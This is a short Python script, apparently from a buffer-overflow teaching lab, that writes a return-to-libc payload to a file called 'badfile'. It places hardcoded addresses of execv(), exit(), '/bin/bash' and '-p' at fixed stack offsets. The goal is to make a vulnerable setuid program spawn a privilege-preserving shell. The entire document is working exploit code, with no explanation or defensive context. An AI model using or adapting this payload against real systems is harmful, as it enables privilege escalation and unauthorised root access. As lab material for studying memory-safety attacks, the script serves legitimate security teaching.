#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

Z = 0x120+8
zero_addr = 0				# The address of "NULL"
content[Z:Z+4] = (zero_addr).to_bytes(4,byteorder='little')


X = 0x120+4
p_addr =    0xffffd6d7        # The address of "-p"
content[X:X+4] = (p_addr).to_bytes(4,byteorder='little')

Y = 0x120	
sh_addr1 = 0xffffd461         # The address of "/bin/bash" argv[0]
content[Y:Y+4] = (sh_addr1).to_bytes(4,byteorder='little')

A = 40
addr = 0xffffce00+0x120         # point to pointer 
content[A:A+4] = (addr).to_bytes(4,byteorder='little')

# above : start of argv[]

B = 36
sh_addr = 0xffffd461       # The address of "/bin/bash"
content[B:B+4] = (sh_addr).to_bytes(4,byteorder='little')

C = 32
exit_addr = 0xf7e03f80  # The address of exit()
content[C:C+4] = (exit_addr).to_bytes(4,byteorder='little')	

D = 28
execv_addr = 0xf7e984b0  # The address of execv()
content[D:D+4] = (execv_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)

